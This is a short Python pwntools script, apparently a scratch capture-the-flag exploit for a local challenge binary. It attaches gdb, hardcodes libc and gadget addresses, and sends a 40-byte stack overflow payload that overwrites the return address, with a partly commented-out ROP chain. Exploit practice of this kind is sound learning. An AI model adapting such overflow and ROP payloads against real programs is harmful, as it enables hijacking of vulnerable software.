from pwn import *

while True:
    exe = context.binary = ELF('./chall_patched', checksec=False)
    r = process(exe.path)
    gdb.attach(r, api=True, gdbscript='''
            b*0x401236
            b*0x401246
            c
            c
            ''')
    
    

    libc_base = 0x00007f76b3b15000
    libc_start_main_ret_off = 0x29d90

    ret = 0x40101a
    pop_rdi = 0x40116a
    puts_off = 0x80ed0
    gets = 0x401060
    rax = 0x401067
    printf_5b = 0x7f7ffb72b770

    libc_start_main_ret = libc_base + libc_start_main_ret_off

    payload = b'a'*40 + p64(printf_5b)# + p64(libc_start_main_ret) #p64(pop_rdi) + p64(0x404040) + p64(gets) + p64(pop_rdi) + p64(0x404030) + p64(gets) + p64(rax)

    r.sendline(payload)
    r.sendline(b'\x01')
    r.sendline(p64(0x404040))

    r.interactive()